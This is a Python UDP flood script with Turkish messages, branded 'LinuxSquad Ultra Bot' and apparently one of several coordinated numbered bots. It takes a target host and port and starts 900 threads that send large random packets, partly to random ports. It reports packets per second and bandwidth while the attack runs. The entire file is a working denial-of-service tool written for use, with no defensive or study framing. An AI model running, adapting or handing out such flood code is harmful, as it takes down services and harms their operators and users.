import socket
import threading
import random
import time
import sys
import os

# ===================== BOT BANNER =====================
bot_id = "2"  # Bu satırı her bot için değiştir: 1,2,3,4,5
os.system("clear")
print(f"\033[92m[+] Bot{bot_id} Başlatıldı - LinuxSquad Ultra Bot\033[0m")

if len(sys.argv) < 3:
    print(f"Kullanım: python bot{bot_id}.py <HEDEF> <PORT> [SÜRE]")
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
duration = int(sys.argv[3]) if len(sys.argv) > 3 else 0

stats = {"packets": 0, "bytes": 0, "start": time.time()}

def udp_worker():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 128 * 1024 * 1024)  # 128MB
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except:
        return

    # Büyük payload'lar
    payloads = [random.randbytes(random.randint(16384, 65500)) for _ in range(40)]

    while True:
        try:
            tport = port if random.random() > 0.25 else random.randint(1, 65535)
            payload = random.choice(payloads)
            sock.sendto(payload, (target, tport))
            stats["packets"] += 1
            stats["bytes"] += len(payload)
        except:
            pass

print(f"\033[91m[+] Bot{bot_id} → Hedef: {target}:{port} | Saldırı başlatılıyor...\033[0m")

# 900 worker her bot için (toplam yüksek güç)
for i in range(900):
    threading.Thread(target=udp_worker, daemon=True).start()
    if i % 150 == 0:
        time.sleep(0.001)

def print_stats():
    while True:
        time.sleep(2)
        elapsed = time.time() - stats["start"]
        if elapsed < 1: continue
        pps = stats["packets"] / elapsed
        mbps = (stats["bytes"] * 8) / (elapsed * 1_000_000)
        print(f"\033[94m[BOT{bot_id}] PPS: {pps:,.0f} | Bandwidth: {mbps:.2f} Mbps\033[0m", end="\r")

threading.Thread(target=print_stats, daemon=True).start()

try:
    if duration > 0:
        print(f"\033[93m[+] Bot{bot_id} {duration} saniye sonra duracak...\033[0m")
        time.sleep(duration)
    else:
        while True:
            time.sleep(10)
except KeyboardInterrupt:
    print(f"\n\033[91m[-] Bot{bot_id} durduruldu\033[0m")
finally:
    elapsed = time.time() - stats["start"]
    mbps = (stats["bytes"] * 8) / (elapsed * 1_000_000) if elapsed > 0 else 0
    print(f"\n\033[92m[+] Bot{bot_id} bitti | Ortalama: {mbps:.2f} Mbps\033[0m")
